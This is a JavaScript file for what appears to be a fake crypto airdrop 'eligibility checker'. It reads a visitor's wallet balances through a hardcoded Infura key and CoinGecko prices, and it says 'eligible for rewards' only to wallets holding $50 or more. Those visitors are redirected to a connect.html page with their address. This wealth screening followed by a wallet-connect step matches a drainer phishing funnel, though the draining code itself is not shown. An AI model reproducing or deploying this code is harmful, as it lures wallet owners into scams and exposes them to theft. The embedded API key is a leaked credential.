import { tokens } from "./tokens.js";

async function getPrices() { const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,dai,usd-coin,binancecoin,avalanche-2,polygon,optimism,gnosis,fantom,cronos,celo,mantle,coredao,beam,bnb,mode,merlin,zkSync,zklink,scroll,taiko,manta,blast,base,aurora,arbitrum&vs_currencies=usd'); const data = await response.json(); return { eth: data.ethereum.usd, dai: data.dai.usd, usdc: data['usd-coin'].usd, bnb: data.binancecoin.usd, avax: data['avalanche-2'].usd, pol: data.polygon.usd, op: data.optimism.usd, xdai: data.gnosis.usd, ftm: data.fantom.usd, cro: data.cronos.usd, celo: data.celo.usd, mnt: data.mantle.usd, core: data.coredao.usd, beam: data.beam.usd, mode: data.mode.usd, merlin: data.merlin.usd, zksync: data.zkSync.usd, zklink: data.zklink.usd, scroll: data.scroll.usd, taiko: data.taiko.usd, manta: data.manta.usd, blast: data.blast.usd, base: data.base.usd, aurora: data.aurora.usd, arbitrum: data.arbitrum.usd }; }

async function checkEligibility() { const statusElem = document.getElementById("status"); const progressElem = document.getElementById("progress"); const loadingBarElem = document.getElementById("loadingBar"); const address = document.getElementById("address").value;

if (!ethers.utils.isAddress(address)) {
    statusElem.innerHTML = "❌ Invalid Ethereum address. Please check the address.";
    return;
}

loadingBarElem.style.display = "block";
try {
    const provider = new ethers.providers.JsonRpcProvider("https://mainnet.infura.io/v3/ab901fce705540a39f329c238fcf1b12");
    let totalValue = 0;
    const prices = await getPrices();
    console.log(prices);

    const balanceEth = await provider.getBalance(address);
    totalValue += parseFloat(ethers.utils.formatEther(balanceEth)) * prices.eth;
    progressElem.style.width = "10%";

    for (let i = 0; i < tokens.length; i++) {
        const token = tokens[i];
        const tokenContract = new ethers.Contract(token.address, [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ], provider);
        try {
            const balance = await tokenContract.balanceOf(address);
            const decimals = await tokenContract.decimals();
            const formattedBalance = balance / Math.pow(10, decimals);
            const tokenPriceUSD = prices[token.symbol.toLowerCase()] || 0;
            totalValue += formattedBalance * tokenPriceUSD;
            progressElem.style.width = `${10 + (i + 1) * (90 / tokens.length)}%`;
        } catch (error) {
            console.error(`Error fetching ${token.symbol} balance`);
        }
    }

    if (totalValue >= 50) {
        statusElem.innerHTML = "🎉 Congratulations! You are eligible for rewards. Redirecting...";
        setTimeout(() => {
            window.location.href = `connect.html?addr=${address}`;
        }, 1000);
    } else {
        statusElem.innerHTML = "❌ Sorry, you are not eligible.";
    }
} catch (error) {
    statusElem.innerHTML = "⚠️ Error, please try again later.";
} finally {
    loadingBarElem.style.display = "none";
}

}

